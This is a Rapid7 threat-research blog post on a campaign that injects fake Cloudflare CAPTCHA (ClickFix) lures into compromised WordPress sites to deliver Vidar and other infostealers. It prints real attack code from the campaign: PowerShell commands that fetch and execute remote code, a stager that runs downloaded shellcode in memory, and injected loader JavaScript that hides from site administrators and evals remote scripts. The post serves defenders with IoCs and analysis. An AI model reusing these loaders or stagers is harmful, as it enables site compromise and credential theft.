# When Trusted Websites Turn Malicious: WordPress Compromises Advance Global Stealer Operation

- **Source :** rapid7
- **URL :** https://www.rapid7.com/blog/post/tr-malicious-websites-wordpress-compromise-advances-global-stealer-operation/
- **Date :** 2026-03-09

---

## Overview

Rapid7 Labs has identified and analyzed an ongoing, widespread compromise of legitimate, potentially highly trusted WordPress websites, misused by an unidentified threat actor to inject a ClickFix implant impersonating a Cloudflare human verification challenge (CAPTCHA). The lure is designed to infect visitors with a multi-stage malware chain that ultimately steals and exfiltrates credentials and digital wallets from Windows systems. The stolen credentials can subsequently be used for financial theft or to conduct further, more targeted attacks against organizations.

The campaign we have analyzed has been active in this exact form since December 2025, although some of the infrastructure (e.g., domain names) date back to July/August 2025. At time of publication, we have identified more than 250 distinct infected websites spanning at least 12 countries: Australia, Brazil, Canada, Czechia, Germany, India, Israel, Singapore, Slovakia, Switzerland, the UK, and the US.

The infected websites include regional news outlets, local business websites, and in one case even a United States Senate candidate’s official webpage (we have notified US authorities about this finding, so that they can confirm the compromise has been remediated). This legitimacy, together with the convincing appearance of the fake Cloudflare CAPTCHA lure, makes this threat dangerous for organizations and individuals alike. It also highlights the importance of staying vigilant online at all times, not only when browsing untrustworthy sites. While the threat actor doesn’t employ particular stealth at the present time, the malware chain is executed almost entirely in memory and in the context of inconspicuous Windows processes, making traditional file-based detection ineffective.

In this blog, we provide an in-depth technical analysis of the complete infection chain, from the first compromised website load, through obfuscated JavaScript, several PowerShell stagers and in-memory shellcode loaders, to several final infostealer payloads observed within the last month: An evolved variant of Vidar stealer, an unnamed .NET stealer we are calling Impure Stealer, and a new C++ stealer, which we believe to be specific to this campaign, and which has been dubbed VodkaStealer. Furthermore, we publish an extensive list of IoCs and YARA detection rules, as well as various resources for unpacking the loader shellcode and algorithms to decrypt stealer configurations, so that defenders can stay ahead of this threat.

Besides the IoCs and detection rules published here, customers with access to Rapid7’s Intelligence Hub will continue to receive the newest intelligence regarding this campaign, as well as individual infostealer families, including (but not limited to) Vidar and Impure Stealer.⠀

![01-attack-chain.jpg](https://www.rapid7.com/cdn/images/blta258eca111bf7254/69af1c57cd033a00088912d4/01-attack-chain.jpg) _Figure 1: Overview of the attack chain_

## First sight: Tracing the infection chain

Our investigation started following an incident handled by Rapid7’s MDR team on January 23rd, 2026. The initial alert indicated the following command being executed on the user’s machine.⠀
    
    
    powershell -c iex(irm 91.92.240[.]219 -UseBasicParsing)

Consequently, another similar command was executed by a child process:
    
    
    "powershell.exe" -Command "try {
        $finalPayload = iwr -Uri "178.16.53[.]70" -UseBasicParsing
        Invoke-Expression $finalPayload.Content
    } catch {
    }"

Rapid7 acquired the user browser history and observed that the user previously navigated to the url hxxps[://]phatapunjab[.]pk/new-pta-tax-for-used-iphone-15-series/ after doing a google search for a related query. At the time, Rapid7 analysts noted that the domain phatapunjab[.]pk was created only a month ago, and so this incident seemed like a classic case of a malicious website poisoning SEO to attract visitors and infect them with malware using ClickFix techniques.

We retrieved and analyzed the next-stage PowerShell script from 178.16.53[.]70. Its purpose was to download a shellcode blob (named cptch.bin) from yet another remote server, 94.154.35[.]115, and execute it utilizing the VirtualAlloc and CreateThread Windows APIs — a standard process injection technique designed to execute malware in memory without touching the disk. The shellcode unpacked a loader that would download yet another shellcode blob from the same server (this time named cptchbuild.bin) and execute it injected into a native svchost.exe process. The final payload embedded in the second shellcode blob turned out to be a Vidar stealer sample, which we'll discuss later in this blog.
    
    
    $u = "hxxp[://]94.154.35[.]115/user_profiles_photo/cptch.bin"
    
    try {
        Write-Host "Loading..." 
    
        $d = Invoke-WebRequest -Uri $u -UseBasicParsing -ErrorAction Stop
        $b = $d.Content
        $s = $b.Length
    
        $c = @"
    using System;
    using System.Runtime.InteropServices;
    public class W {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint t, uint p);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr CreateThread(IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint cf, out uint tid);
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern uint WaitForSingleObject(IntPtr h, uint ms);
    }
    "@
    
        Add-Type -TypeDefinition $c
    
        $m1 = 0x1000
        $m2 = 0x2000
        $p = 0x40
    
        $addr = [W]::VirtualAlloc([IntPtr]::Zero, $s, $m1 -bor $m2, $p)
    
        if ($addr -eq [IntPtr]::Zero) {
            throw "Alloc failed"
        }
    
        [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $addr, $s)
    
        $tid = 0
        $th = [W]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$tid)
    
        if ($th -eq [IntPtr]::Zero) {
            throw "Thread failed"
        }
    
        [W]::WaitForSingleObject($th, 30000) | Out-Null
        Write-Host "done."
    
    } catch {
        Write-Error $_.Exception.Message
        exit 1
    }

_Figure 2: PowerShell stager executing remote shellcode in memory_

On February 3rd, an almost identical case was handled by Rapid7 in another customer’s environment. Just like in the previous case, a PowerShell command was executed and shellcode was downloaded from hxxp[://]94.154.35[.]115/user_profiles_photo/cptch.bin; however, this time, the final payload was different. Instead of Vidar, a .NET stealer was encrypted in the second shellcode blob.

This time, the MDR team identified the ClickFix infection source as website missionloans[.]com, which is a significantly more established domain name and seems to belong to a legitimate US company.

![02-missionloans-captcha.png](https://www.rapid7.com/cdn/images/bltf46ddd1f8daf13bd/69af1c560e4ec100086cd2c3/02-missionloans-captcha.png) _Figure 3: Fake Cloudflare CAPTCHA shown on missionloans[.]com_

⠀

Around the same time, malware analyst @ShadowOpCode on X (fka Twitter) [reported](https://x.com/ShadowOpCode/status/2016190716284690634) a similar case, where a Swiss website wepro[.]ch was compromised and followed the exact same Vidar chain we’ve described above, and on February 17th, X user @James_inthe_box [shared](https://x.com/James_inthe_box/status/2023887918151197122) intelligence on a similar infection in www[.]mrfpaint[.]com.

![03-mrfpaint-captcha.jpeg](https://www.rapid7.com/cdn/images/bltda7843a630d56658/69af1c568da8010008537c44/03-mrfpaint-captcha.jpeg) _Figure 4: Fake Cloudflare CAPTCHA shown on www[.]mrfpaint[.]com in a sandbox environment_

⠀

Noticing the similar pattern in all of these cases, which suggested the ClickFix infections originated from compromised legitimate websites, we wanted to research the mechanism behind the compromise and hunt for more compromised sites and the malicious scripts they load.

## Technical analysis: Dissecting the infection mechanism

Because none of the previously reported websites presented the ClickFix payload anymore at the time of our analysis, we opted to hunt for compromised sites by pivoting from domains hosting the ClickFix implant, which all resolved to the same IP address (94.154.35[.]152). We queried related URLs and noticed that many of them included a query parameter hinting at a possible referrer, or a compromised website loading the malicious content.

**Date**| **URL**  
---|---  
2026/02/25| hxxps[://]gieable[.]shophxxps[://]namsioc[.]shop  
2026/02/21| hxxps[://]goarnsds[.]shop  
2026/02/19| hxxps[://]surveygifts[.]org  
2026/02/18| hxxps[://]gorscts[.]shophxxps[://]greecpt[.]shop/?ref=vifaexpo.com  
2026/02/17| hxxps[://]captoolsz[.]com/?ref=www.taylorautoservices.comhxxps[://]greecpt[.]shophxxps[://]captoolsz[.]com/captcha.html  
2026/02/16| hxxps[://]captioz[.]shop/?ref=shmuelcohen.comhxxps[://]namzcp[.]org/captcha.html  
2026/02/15| hxxps[://]cptoptious[.]com/?ref=agmagency.comhxxps[://]cptoptious[.]com/?ref=www.violaobrasileiro.com.brhxxps[://]cptoptious[.]com/?ref=fnbdubai.com  
2026/02/14| hxxps[://]captiort[.]shop/  
2026/02/06| hxxps[://]beta-charts[.]org/  
2026/02/03| hxxps[://]captioto[.]com/?ref=dakarailarriett.comhxxps[://]capztoolz[.]com/?ref=www.de-eng.co.il  
2026/02/02| hxxps[://]cptoptious[.]com/?ref=latourfides.comhxxps[://]capztoolz[.]com/?ref=www.bvd.co.ilhxxps[://]captioto[.]com/?ref=addvera.eu  
2026/02/01| hxxps[://]surveygifts[.]org/  
2026/01/29| hxxps[://]captolls[.]com/captcha.html  
2026/01/28| hxxps[://]cptoptious[.]com/?ref=www.renardetcaramel.com  
2026/01/27| hxxps[://]captiorweb[.]com/  
2026/01/22| hxxps[://]captiorweb[.]com/captcha.html  
2026/01/15| hxxps[://]cptoptious[.]com/?ref=www.tamireland.ie  
2026/01/12| hxxps[://]cptoptious[.]com/?ref=www.malam-payroll.com  
2026/01/10| hxxps[://]cptoptious[.]com/?ref=www.michiganautolaw.com  
2026/01/09| hxxps[://]cptoptious[.]com/captcha.htmhxxps[://]cptoptious[.]com/?ref=engagenreap.comhxxps[://]cptoptious[.]com/?ref=www.danneventhire.com.auhxxps[://]cptoptious[.]com/?ref=proactivwellnesscenters.comhxxps[://]cptoptious[.]com/?ref=topsoftwarecompanies.cohxxps[://]cptoptious[.]com/?ref=bigenpakistan.comhxxps[://]cptoptious[.]com/?ref=naturaltimberstone.com.au/hxxps[://]cptoptious[.]com/?ref=alchemistpeptides.comhxxps[://]cptoptious[.]com/?ref=nzimmigration.info/hxxps[://]cptoptious[.]com/?ref=3plusa.nethxxps[://]cptoptious[.]com/?ref=www.unigib.edu.gihxxps[://]cptoptious[.]com/?ref=janadventures.comhxxps[://]cptoptious[.]com/?ref=blog.webrigo.com  
2026/01/01| hxxps[://]cptoptious[.]com/?ref=3plusa.net  
  
 _Table 1:__URLs seen resolving to_ _94.154.35[.]152_

At that point, none of the referring websites seemed to be infected (or actively being used by the attacker) anymore, either. However, using public data from [urlscan.io](http://urlscan.io) and the search query: date:>now-30d AND domain:(gorscts[.]shop OR greecpt[.]shop OR captiort[.]shop OR captioz[.]shop OR namzcp[.]org OR beta-charts[.]org OR captoolsz[.]com OR capztoolz[.]com OR surveygifts[.]org OR captolls[.]com OR captiorweb[.]com OR captioto[.]com OR cptoptious[.]com), we were able to find past scans of compromised websites contacting one of the known ClickFix domains and inspect the HTTP responses.

We determined that compromised websites included many potentially high-trust websites, as noted above. One striking thing all of these websites had in common was the use of the WordPress content management system (CMS), and in particular, nearly all of the websites publicly exposed an admin login panel. We checked a selection of these websites for known-vulnerable plugins or versions of WordPress itself, but no obvious common pattern was identified.

One such scan we found was of an Australian online pharmacy website (hxxps[://]medsnsw[.]com/product/buy-xanax-alprazolam-australia/, [urlscan.io scan](https://urlscan.io/result/019c342b-f83e-757f-ab7a-5ed6c7ff5ad7/#transactions)). The recorded HTML response included the following script:
    
    
    if(!window.__performance_optimizer_v6){
        window.__performance_optimizer_v6=true;
    	if(!/wordpress_logged_in_/.test(document.cookie)){
    		var perfEndpoints=["aHR0cHM6Ly9nb3ZlYW5ycy5vcmcvanNyZXBvP3JuZD0=","aHR0cHM6Ly9nZXRhbGliLm9yZy9qc3JlcG8\/cm5kPQ==","aHR0cHM6Ly9nb3ZlYXJhbGkub3JnL2pzcmVwbz9ybmQ9","aHR0cHM6Ly9saWdvdmVyYS5zaG9wL2pzcmVwbz9ybmQ9","aHR0cHM6Ly9hbGlhbnplZy5zaG9wL2pzcmVwbz9ybmQ9","aHR0cHM6Ly96dGRhbGl3ZWIuc2hvcC9qc3JlcG8\/cm5kPQ=="];
    		function loadPerformanceScript(endpointIndex){
    			if(endpointIndex>=perfEndpoints.length)return;
    			try{
    				var endpointUrl=atob(perfEndpoints[endpointIndex])+Math.random();
    				var performanceXHR=new XMLHttpRequest();
                    performanceXHR.open("GET",endpointUrl,false);
                    performanceXHR.send();
    				if(performanceXHR.status==200){
    					var optimizerScript=document.createElement("script");
                        optimizerScript.text=performanceXHR.responseText;
                        document.head.appendChild(optimizerScript)
                    }else{
                        loadPerformanceScript(endpointIndex+1)
                    }
                }catch(e){
                    loadPerformanceScript(endpointIndex+1)
                }
            }
            loadPerformanceScript(0)
        }
    }

_Figure 5: A malicious loader script included in the_ _medsnsw[.]com_ _website HTML_

Masquerading as a performance optimization script, the actual purpose of the code above was to find and inject the first live script from a hardcoded set of remote locations, encoded in Base64. This would only be done when the string wordpress_logged_in_ was not found in the website’s (non-HTTP-only) cookies, hinting at an intent to hide this snippet from site administrators and editors.
    
    
    > perfEndpoints.map(atob)
    [
    	'hxxps[://]goveanrs[.]org/jsrepo?rnd=',
    	'hxxps[://]getalib[.]org/jsrepo?rnd=',
    	'hxxps[://]govearali[.]org/jsrepo?rnd=',
    	'hxxps[://]ligovera[.]shop/jsrepo?rnd=',
    	'hxxps[://]alianzeg[.]shop/jsrepo?rnd=',
    	'hxxps[://]ztdaliweb[.]shop/jsrepo?rnd='
    ]

_Figure 6: Decoded list of JavaScript source locations_ _  
_⠀

Consistent with this, the next request recorded in the scan fetched a script from goveanrs[.]org ([urlscan response](https://urlscan.io/responses/8c83b46a7ca674bf717765b734a919c78556c193d1942de94be409c4ed663d1a/)), which we analysed to understand how the ClickFix content was injected into the website and how we could potentially identify more compromised websites.

Continuing the hunt, we’ve also identified an alternative way of loading the ClickFix JavaScript: In these cases, the script was hosted directly on the compromised WordPress instance and was retrieved by fetching /wp-admin/admin-ajax.php?action=ajjs_run.
    
    
    (function(){
    	if (window.__AJJS_LOADED__) return;
        window.__AJJS_LOADED__ = false;
    
    	function runAJJS() {
    		if (window.__AJJS_LOADED__) return;
            window.__AJJS_LOADED__ = true;
    
    		const cookies = document.cookie;
    		const userAgent = navigator.userAgent;
    		const referrer = document.referrer;
    		const currentUrl = window.location.href;
    
    		if (/wordpress_logged_in_|wp-settings-|wp-saving-|wp-postpass_/.test(cookies)) return;
    
    		if (/iframeShown=true/.test(cookies)) return;
    
    		if (/bot|crawl|slurp|spider|baidu|ahrefs|mj12bot|semrush|facebookexternalhit|facebot|ia_archiver|yandex|phantomjs|curl|wget|python|java/i.test(userAgent)) return;
    
    		if (referrer.indexOf('/wp-json') !== -1 ||
                referrer.indexOf('/wp-admin') !== -1 ||
                referrer.indexOf('wp-sitemap') !== -1 ||
                referrer.indexOf('robots') !== -1 ||
                referrer.indexOf('.xml') !== -1) return;
    
    		if (/wp-login\.php|wp-cron\.php|xmlrpc\.php|wp-admin|wp-includes|wp-content|\?feed=|\/feed|wp-json|\?wc-ajax|\.css|\.js|\.ico|\.png|\.gif|\.bmp|\.jpe?g|\.tiff|\.mp[34g]|\.wmv|\.zip|\.rar|\.exe|\.pdf|\.txt|sitemap.*\.xml|robots\.txt/i.test(currentUrl)) return;
    
            fetch('hxxps[://]dakarailarriett[.]com/wp-admin/admin-ajax.php?action=ajjs_run')
            .then(resp => resp.text())
            .then(jsCode => {
    			try { eval(jsCode); } catch(e) { console.error('Cache optimize error', e); }
            });
        }
    
    	if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', runAJJS);
        } else {
            runAJJS();
        }
    })();

_Figure 7: Alternative way of loading ClickFix script observed on_ _dakarailarriett[.]com_

This variant is interesting in that it attempts to more robustly evade administrative scrutiny by explicitly checking the document referrer, the window location (URL), as well as multiple WordPress-related cookies, checking signs not only of administrative access, but also automatic crawlers or other artifacts indicating the website is being loaded by an undesirable victim. In these cases, no AJAX request to admin-ajax.php is issued.

Lastly, we have seen several cases where the ClickFix injector script was directly pasted into the website source.

### ClickFix loader JavaScript analysis

The obfuscated JavaScript returned by the AJAX endpoint or the dedicated host server aims to make analysis difficult by outlining and encrypting strings and constants, utilizing niche JavaScript mechanics, synthesizing opaque predicates and dead code, and employing clever tricks to detect and thwart analysis.

After an initial auto-deobfuscation pass using the tool available at [https://obf-io.deobfuscate.io/](https://obf-io.deobfuscate.io/), the high-level control flow of the script can be identified rather easily. It’s apparent that the file was transformed using a commonly used obfuscator, which creates a global encrypted string array that is first rotated and shuffled and then accessed from across the script to access and decode strings just in time. During the initial transformation, a sneaky anti-analysis check is performed that enters an infinite loop in case the script is not running in its original form. In our sample (see the IoCs section), _0x4927 is the function that returns this global string array and _0x288c is the function decoding the strings and containing the anti-analysis check.
    
    
    // Closure that holds the global encrypted string array.
    function _0x4927() {
    	const _0x1099ec = ['eGC3W5rW', 'owxcKc/cSW', 'DCkLvKxdUq', 'gCoHWQpcL3m', 'W67cQIXUW44', 'W6evAmo4W6a', /* ... */];
      _0x4927 = function () {
    		return _0x1099ec;
      	};
    	return _0x4927();
    }
    
    // Initial loop which shuffles the array until a condition is met.
    (function (_0x44d6db, _0x238a8b) {
    	const _0x43fe80 = _0x44d6db();
    	while (true) {
    		try {
    			const _0x18408f = parseInt(_0x288c(1632, ')c9q')) / 1
    				+ parseInt(_0x288c(1700, 'bx%O')) / 2
    				+ -parseInt(_0x288c(700, '&Blv')) / 3
    				+ -parseInt(_0x288c(553, 'VOv0')) / 4
    				+ parseInt(_0x288c(638, 'bi$%')) / 5 * (parseInt(_0x288c(1126, 'KcZ$')) / 6)
            		+ parseInt(_0x288c(762, 'KgMi')) / 7 * (-parseInt(_0x288c(1696, '9d$R')) / 8)
            		+ parseInt(_0x288c(559, 'd3q[')) / 9 * (parseInt(_0x288c(1050, '&Blv')) / 10);
    			if (_0x18408f === _0x238a8b) {
    				break;
          		} else {
            	_0x43fe80.push(_0x43fe80.shift());
          		}
        	} catch (_0x537399) {
         	 _0x43fe80.push(_0x43fe80.shift());
        	}
     	 }
    })(_0x4927, 463699);

_Figure 8: Code listing illustrating the global string array idiom_

The anti-analysis check makes use of a clever assumption: While the script is deployed obfuscated and minified, analysts will presumably first transform it into a more readable representation before evaluating chunks of it. The anti-analysis check consists of testing the string representation of a previously defined dummy function against a regex. In JavaScript, the string representation of a non-native function (i.e. the string returned by the toString method called on the function object) is the _verbatim definition_ of the function, including any whitespace, comments, etc. In this case, the code specifically checks if the function was defined with any whitespace after the opening curly brace — in effect, function(){return ‘newState’;} will pass the check, but function() { return ‘newState’; } will not.
    
    
    function _0x288c(index, _4_chars) {
    	/* ... (Actual decoding logic, not important.) */
    
        // The KLCBjr attribute of _0x288c is set when the anti-analysis
        // check has been passed -> the 'if' body is executed only the first time.
    	if (_0x288c.KLCBjr === undefined) {
    		const AntiDebug = function (ref_to_0x288c_function) {
    			this.ref_to_0x288c_function = ref_to_0x288c_function;
    			this.yyIdzW = [1, 0, 0];
    			this.regexTestedFunction = function () {
    				return 'newState';
                };
            };
            AntiDebug.prototype.testFunctionRepr = function () {
    			const regex = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
    			const test_result = regex.test(this.regexTestedFunction.toString()) ? --this.yyIdzW[1] : --this.yyIdzW[0];
    			return this.enterInfiniteLoopIfFalse(test_result);
            };
            AntiDebug.prototype.enterInfiniteLoopIfFalse = function (zero_or_one) {
    			if (!Boolean(~zero_or_one)) {
    				return zero_or_one;
                }
    			return this.infiniteLoop(this.ref_to_0x288c_function);
            };
    		// This function infinitely appends elements to this.yyIdzW.
    		AntiDebug.prototype.infiniteLoop = function (ref_to_0x288c_function) {
    			let i = 0;
    			for (let length = this.yyIdzW.length; i < length; i++) {
    				this.yyIdzW.push(Math.round(Math.random()));
    				length = this.yyIdzW.length;
                }
    			return ref_to_0x288c_function(this.yyIdzW[0]);
            };
    		// Anti-analysis check is invoked -> loops infinitely if the check fails.
    		new AntiDebug(_0x288c).testFunctionRepr();
    		// Attribute of function is written to skip the check from now on.
    		_0x288c.KLCBjr = true;
        }
    
    	/* ... */
    }

_Figure 9: Annotated string decoding function containing an anti-analysis check_

Luckily, this check can be bypassed even without de-obfuscating the function, simply by setting the “check passed” flag (_0x288c.KLCBjr = true) immediately after the function is defined.

Apart from the initial check, there is also a periodical trap to debugger triggered every 4 seconds to thwart DevTools-based debugging, and the last anti-debugging measure the obfuscator includes is a replacement of all console logging methods with no-op functions, so that trying to debug-print expressions will do nothing (despite the string representation of the methods looking normal).

Stripping all this anti-analysis code away, we’re left with the actual logic. All of the remaining obfuscation relies on decrypting strings using the _0x288c function from before, and outlining constants and functions into an (immutable) dictionary object.
    
    
    // Example of an immutable dictionary with outlined constants and functions.
    const _0x1f62bb = {
    	'SEDWD': _0x288c(494, 'jRBP'),
    	'xPXNi': _0x288c(997, 'VJ)K'),
    	'fxaUb': _0x288c(1722, 'AFao'),
    	'NMdCB': _0x288c(1026, 'c[l*'),
    	'MwFFz': _0x288c(1055, '0YkN') + _0x288c(657, '8k1N') + _0x288c(1037, 'DoFz') + ')',
    	/* ... */
    	'LtnFV': function (_0x4711dd, _0x395488, _0x450231) {
    		return _0x4711dd(_0x395488, _0x450231);
        },
    	/* ... */
    	'RqVmA': function (_0x34f24d, _0xf681c2) {
    		return _0x34f24d !== _0xf681c2;
        },
    	'jkPPL': _0x288c(1004, '9Ea9')
    };
    
    // Example of an opaque predicate using the outlined code.
    // The predicate is unconditionally false, so the true branch of the 'if' is never executed.
    // The unreachable branch references undeclared variables, possibly to break analysis tools.
    if (_0x1f62bb[_0x288c(606, '@0X6')](_0x1f62bb[_0x288c(1088, '9Ea9')], _0x1f62bb[_0x288c(686, 'AFao')])) {
    	if (_0x4eb07e) {
    		const _0x1ecc29 = _0x158fa0[_0x288c(1689, 'udfh')](_0x585a9a, arguments);
            _0x45d6ea = null;
    		return _0x1ecc29;
        }
    }

_Figure 10: Code listing illustrating some of the JavaScript code obfuscations_

When these obfuscations are removed (inlined and evaluated), the script logic turns out to be rather simple. A target URL for the ClickFix iframe is defined and the browser local storage (specific to the host website) is queried for the key iframeShown. This key is set once the malicious iframe has been displayed 3 times, after which it is not displayed anymore. Once the DOM of the host website is fully loaded, the iframe is constructed, its source is set to the target url with a query parameter ref set to the hostname of the infected website, and it is appended to the document body (positioned on top of everything else).

A deobfuscated snippet of the raw ClickFix injector script logic can be [found](https://github.com/rapid7/Rapid7-Labs/blob/main/Misc/ClickFix_DoubleDonut_Deobfuscated_Injector.js.txt) on Rapid7 Labs’ public GitHub.

Note that the threat actor clearly intended only to show the iframe once every 30 days at most by setting and checking a cookie for the host website, as well as to dismiss the iframe after 5 seconds of clicking the button inside the iframe. But as became apparent when analyzing the JavaScript running in the ClickFix iframe, they in fact never post the “buttonClicked” message to the host website.

This makes the compromise much more obvious, since the website has to be loaded a total of 4 times before it becomes usable again, instead of dismissing the ClickFix automatically with 5 seconds of a click and only displaying it once every 30 days. This, in our opinion, explains why so many of the compromised websites might have been sanitized so quickly. The question remains whether they _truly_ have been sanitized, and whether the root cause of the compromise — which remains unconfirmed — was also properly addressed.

In any case, using information obtained from these de-obfuscated snippets, we have been able to hunt for and find many more compromised websites, JavaScript hosting domains and fake CAPTCHA implant hosting domains, which are all included in the IoCs section.

### ClickFix payload JavaScript analysis

The JavaScript embedded in the captcha.html files loaded by the injected iframes is obfuscated in the exact same way described before, only this time it is split into one script in the <head> element and one script in the document <body>. The de-obfuscated snippets, [available](https://github.com/rapid7/Rapid7-Labs/blob/main/Misc/ClickFix_DoubleDonut_Deobfuscated_Payload.js.txt) in our public GitHub repository, probably need little explanation — the former simply sets up the click event handler to copy the malicious command to the clipboard, and the latter populates the HTML with a chosen translation of the ClickFix instructions, which is chosen based on the declared locale of the host website.

The CAPTCHA instructions are available in (at least) 31 languages: English, French, German, Spanish, Italian, Portuguese, Dutch, Russian, Ukrainian, Polish, Turkish, Romanian, Hungarian, Czech, Swedish, Finnish, Danish, Norwegian, Greek, Bulgarian, Serbian, Croatian, Hebrew, Arabic, Indonesian, Malay, Thai, Vietnamese, Estonian, Latvian, and Lithuanian.

### Double Donut: Two-stage shellcode loader analysis

Besides the identical ClickFix injector scripts and the shared infrastructure hosting them, another characteristic tying all these compromises together into a single campaign is the singular IP address hosting the final malware payloads (94.154.35[.]115, moved to 172.94.9[.]187 at the beginning of March). While the initial PowerShell stager C2s vary (see IoCs), eventually they always lead to the same shellcode loader hosted at this server. It should be noted that nearly all of the hosts observed in the attack belong to Autonomous System (AS) number 202412.

As it turns out, the position independent loader used by the threat actor is the open-source [Donut loader (GitHub)](https://github.com/TheWover/donut), which has been commonly seen already in past ClickFix campaigns. Luckily, the open-source Donut loader is met with an open-source [Donut decryptor (GitHub)](https://github.com/volexity/donut-decryptor), which we can use to automatically decrypt and extract the payload and metadata.

A defining feature of this campaign is that the Donut loader is used twice in sequence. The first Donut shellcode (cptch.bin) loads only a small executable that tries to acquire SeDebugPrivilege and then downloads the second Donut shellcode (cptchbuild.bin) from the same remote server, which it then injects into a service host process (svchost.exe) matching the native architecture (non-WOW64 process on x64, no effect on x86). We will call this downloader binary the “DoubleDonut Loader” for brevity. The second shellcode in turn contains the final infostealer payload executable. For convenience, we are referring to this whole component of the attack (1st shellcode -> downloader -> 2nd shellcode) as “DoubleDonut”.

![04-doubledonut-loader.png](https://www.rapid7.com/cdn/images/bltd17d532637378e67/69af1c564e5c7e00088acb9b/04-doubledonut-loader.png) _Figure 11: The simplistic design of the DoubleDonut Loader_

⠀

The downloaded shellcode is injected and executed using a standard sequence of OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD), VirtualAllocEx, WriteProcessMemory and CreateRemoteThread.

### Updates to Vidar Stealer v2

As mentioned previously, one of the payloads we saw DoubleDonut deliver in late January was the notorious Vidar stealer. One evolution of this infostealer malware that we have not seen publicly documented before is a shift towards encrypted C2 configurations and string obfuscation. The sample we’ve analysed (see the IoCs section for a hash) also employs a different control flow graph obfuscation than the previously reported CFG flattening technique.

Apart from each string in Vidar samples being XORed with a random single-byte constant (unique per string; usage of 0x00 results in the string being unchanged), a custom encryption algorithm is now used specifically to hide C2 configurations. The C2 configuration is an array of up to 7 records, where every record contains 3 strings: the C2 URL itself, an identifier/anchor used for parsing dead drop resolver responses, and an optional User-Agent string.
    
    
    struct VidarV2ConfigEntry
    {
    	char url        [0x100];
    	char anchor     [0x100];
    	char user_agent [0x100];
    }
    
    /* .rdata section */
    constexpr static const char *g_encrypted_build_version = "...";
    constexpr static const char *g_encrypted_build_id = "...";
    constexpr static const char *g_decryption_key = "...";
    constexpr static struct VidarV2ConfigEntry g_encrypted_config[7] = { /* ... */ };

_Figure 12: A high-level representation of the C2 configuration layout in latest Vidar samples_

Based on whether the C2 URL contains the string .me/ or amcommunity.com, the URL is either fetched and resolved to the true C2, or used as a C2 directly. The C2 resolution is done by finding the anchor string in the HTML response and extracting the URL following it, delimited by a vertical pipe symbol (|). This technique, used notoriously by both Vidar and Lumma stealers, allows the attackers to rotate C2 addresses without invalidating the malware samples already released into the wild.

![05-steam-vidar.png](https://www.rapid7.com/cdn/images/blta3d5377991de041c/69af1c56cd033a00088912d0/05-steam-vidar.png) _Figure 13: A Steam profile being used as a dead drop resolver by Vidar with anchor “ho0r1”_

⠀

Unlike other infostealers, which use standard symmetric cipher algorithms to decrypt their configurations (e.g. ChaCha20 used by Lumma or RC4 by StealC), Vidar invents its own Vigenère-like decryption routine, which can be replicated in Python like this:
    
    
    def vidar_c2_config_string_decode(
        ciphertext: str,
        key: str,
        alphabet: str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&()*+,-./:;<=>?@[]^_`{|}~ "
    ) -> str:
        key_len = len(key)
        alpha_len = len(alphabet)
    	assert key_len != 0 and alpha_len != 0 and key_len == alpha_len, "Invalid key or alphabet length"
    
    	max_len = min(len(ciphertext), 512)
        out = []
    	for i in range(max_len):
            ch = ciphertext[i]
            key_offset = max(0, key.find(ch))
            decoded_ch = alphabet[(key_offset - i) % key_len]
            out.append(decoded_ch)
    
    return "".join(out)

_Figure 14: A reimplementation of Vidar C2 decryption routine in Python_

To help researchers and defenders analyze and track this threat, we are publishing a [C2 configuration extractor script](https://github.com/rapid7/Rapid7-Labs/blob/main/Malware%20Config%20Extractors/vidar_v2_extract.py) that can be run on any Vidar payload that uses this decryption procedure.

Apart from the encrypted C2 configuration, another upgrade Vidar introduced is a new mechanism for control-flow obfuscation. Previously, Vidar payloads implemented a simple CFG flattening algorithm, which, albeit effective, is quite common and easy to reverse. The new samples use a related, but different technique, which consists of a combination of:

  * Opaque predicates referencing global variables,

  * Infinite loops in dead branches,

  * alloca constructs (call; sub rsp, rax) with obfuscated constant arguments (to break decompilers), and

  * Jumps from dead branches to previous code blocks, which results in decompilers interpreting these as while(1)-style loops and duplicating a lot of the code in the output.⠀


![06-vidar-cfg-ida.png](https://www.rapid7.com/cdn/images/bltad90bfe53974b5a7/69af1c5677fad000083ddbf3/06-vidar-cfg-ida.png) _Figure 15: Excerpt from Hex-Rays IDA decompiler output for “main” stealer subroutine_

### Impure Stealer (.NET)

Another payload we’ve seen DoubleDonut deliver is an unknown, or rather so far unnamed, .NET infostealer. Upon a first glance at its network communications, one may infer similarities with the PureLogs stealer family — namely the use of a custom Type-Length-Value (TLV) data encoding, which constitutes a sort of a custom network protocol on top of TCP — and some vendors actually classify the sample as such. However, a closer examination reveals that this is an otherwise unrelated stealer, using different obfuscator tools, different mechanism for config decryption, and AES-256-CBC with a server-provided key for encryption of C2 communication, whereas PureLogs uses 3DES with a hard-coded key. For these reasons, we’ve decided to call this malware **Impure Stealer**.

![07-impure-entry.png](https://www.rapid7.com/cdn/images/blt7cf8efea9159c700/69af1c56856e0e000832ed8d/07-impure-entry.png) _Figure 16: Stealer entry point method disassembled using dnSpy_

⠀

Besides the specific naming convention used for type and variable names and the code-flattening and opaque predicate obfuscations, the stealer can be identified by a repeating string decoding/decryption pattern, which is illustrated already by the first statement in the entry point method. There, column0051.offset6910 is called with a hexadecimal string and a signed 32-bit integer as arguments — this is in fact the string decryption routine.

Besides the integer key, the decryption routine depends on one more input, specific per sample, which is a permutation of the 16 hexadecimal digit characters. This alphabet is stored as a static constant (column0051.source97 in our particular sample) and can be found referenced from offset6910 indirectly via the column0051.temp67 method.

The decryption algorithm itself can be rewritten as follows:⠀
    
    
    def impure_stealer_string_decode(
        hex_ciphertext: str,
        key: int,
        alphabet: str
    ) -> str:
